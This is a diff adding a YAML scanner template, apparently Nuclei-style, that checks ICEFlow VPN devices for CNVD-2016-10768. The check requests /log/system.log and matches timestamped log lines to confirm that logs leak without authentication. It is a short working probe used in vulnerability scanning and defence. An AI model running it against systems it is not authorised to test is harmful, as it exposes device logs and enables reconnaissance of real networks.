@@ -1,0 +1,23 @@
+id: yaml-poc-iceflow-icevpn-leak-CNVD-2016-10768
+info:
+  name: Yaml Poc Iceflow Icevpn Leak Cnvd 2016 10768
+  author: converted
+  severity: medium
+  description: 'Converted from xpoc: yaml-poc-iceflow-icevpn-leak-CNVD-2016-10768'
+  tags: xpoc
+  reference:
+  - http://disk.scan.cm/zlsec/zlsec_info/document/wiki/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/ICEFlow/ICEFlow%20VPN%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md?hash=zE0KEPGJ
+http:
+- method: GET
+  path:
+  - /log/system.log
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: regex
+    part: body
+    regex:
+    - \\d{4}/\\d{2}/\\d{2}\\s+\\d{2}:\\d{2}:\\d{2}\\s+ICEFLOW\\s+(.*):(.*)\n
